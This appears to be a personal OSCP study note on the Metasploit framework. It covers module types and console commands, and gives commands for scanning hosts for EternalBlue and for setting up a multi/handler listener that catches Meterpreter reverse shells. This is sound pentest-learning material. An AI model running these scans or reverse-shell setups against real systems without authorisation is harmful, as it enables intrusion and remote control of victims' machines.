# Metasploit concept

# Structure

Metasploit is a modular pentesting framework. Altough it is prohibited to use metasploit more than once during the OSCP, it can be a real life save when you desperately need those 10 points and ran out of ideas.

List of modules:

/usr/share/metasploit-framework/modules
├── auxiliary
├── encoders
├── evasion
├── exploits
├── nops
├── payloads
└── post

* auxiliary: scanning, crawlers and other helpful stuff
* encoders: encode payloads and exploits to work on some platform or lesser detection avoidance
* evasion: avoid anti virus
* exploits: run it to exploit remotely to get RCE or locally to escalate privileges once session is established.
* nops: used in budder overflows to achieve some payload size and are 0x90 instructionss
* payloads: binary to be execute once exploit kicks in on target system. Staged: small initial downloader stage, big active payload. Stageless: single large payload. 
* post: post exploitation tools such as backdoors


# Common commands

* search: look for arbitrary module according to search string
* info: full information about module
* show options: show module options
* set [option] [value]: assign value to some module's option 
* unset: opposite of set
* setg [option] [value]: assign value across multiple modules
* exploit or run: activate module
* sessions: list sessions
* sessions [session_id]: interact with a specific session
* background sessions: CTRL+Z


## Example

look for Eternal Blue hosts

```
use auxiliary/scanner/smb/smb_ms17_010

set RHOSTS iprange

run

enjoy

```


## Multi Handler for Shells

This payload is used to provide a universal listener to multiple reverse shells.

Basic usage:

1. start handler (listener) with payload tailored to target host

```
msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.11.0.xxx

msf exploit(multi/handler) > exploit
# wait for session
```

2. Deploy exploit containing meterpreter reverse shell on target host
3. Once exploited target shall create a reverse shell to our multi handler
4. Name multi comes from ability to handle multiple connections at once


